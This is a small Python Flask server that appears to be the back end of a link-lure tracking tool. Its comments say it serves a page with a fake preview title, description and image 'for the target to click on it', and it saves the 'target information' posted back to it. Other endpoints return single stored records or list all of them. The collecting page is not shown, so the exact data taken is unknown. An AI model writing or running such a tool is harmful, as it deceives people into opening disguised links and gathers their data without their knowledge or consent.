from flask import Flask, render_template, request
import json
from flask_cors import CORS, cross_origin
from hashlib import md5


app = Flask(__name__)
CORS(app, supports_credentials=False)

# db
USERS = {}

# payloads
PAYLOADS = {
    'poisson': {
        'title': 'poisson qui vole',
        'description': 'poisson qui vole sur les voitures',
        'image': 'https://i.ytimg.com/vi/-qXSyeEu7D0/maxresdefault.jpg',
        'url': 'http://testtest.com',
    }
}

# hash
def hashit(string: str) -> str:
    return md5(string.encode('utf-8')).hexdigest()


@app.route('/')
def index():
    return ""


# 1-) to set the payload html
# for the target to clck on it
@app.route('/<link_uid>')
def set_payload(link_uid: str):
    payload = PAYLOADS.get(link_uid, {})
    return render_template(
            './index.html',
            title=payload.get('title'),
            description=payload.get('description'),
            image=payload.get('image'),
            url=payload.get('url')
    )


# 2-)  Save our target information
# ...
@app.route('/save', methods=['POST'])
def save_info():
    data = request.get_json()

    user_key = hashit(json.dumps(data))
    USERS[user_key] = data

    return {'status': 'true'}, 200


# 3-) to get a user information we aved precedently
@app.route('/user/<user_uid>')
def get_user(user_uid: str):

    user = USERS.get(user_uid, {})

    return user, 200 if bool(user) else 404


# 4-) return all users
@app.route('/users')
def get_users():
    users_list = list(USERS.keys())

    return users_list, 200


if __name__ == '__main__':
    app.run(port=3001, debug=True)
